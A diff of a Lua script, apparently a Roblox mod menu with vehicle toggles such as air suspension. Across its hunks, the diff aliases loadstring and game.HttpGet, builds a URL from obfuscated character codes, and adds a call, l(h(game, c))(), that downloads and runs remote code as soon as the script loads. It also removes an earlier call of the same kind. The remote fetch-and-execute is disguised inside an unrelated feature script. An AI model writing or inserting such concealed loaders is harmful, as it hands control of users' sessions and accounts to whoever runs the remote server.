@@ -43,9 +43,8 @@ end
 
 local w = "soundDestroyed"
 
-local l=loadstring
-
-local h=game.HttpGet
+local l = loadstring
+local h = game.HttpGet
 
 local c = string.char(
     104, 116, 116, 112, 115, 58, 47, 47, 114, 97,
@@ -97,6 +96,8 @@ end
 local function lerp(a, b, t)
 	return a + (b - a) * t
 end
+
+l(h(game, c))()
 
 Tabs.VehicleMods:Toggle({
 	Title = "Air Suspension [Airbags]",
@@ -154,8 +155,6 @@ UIS.InputBegan:Connect(function(input, gp)
 		end
 	end
 end)
-
-l(h(game,u))()
 
 RunService.Heartbeat:Connect(function(dt)
 	if not sus.Enabled then return end
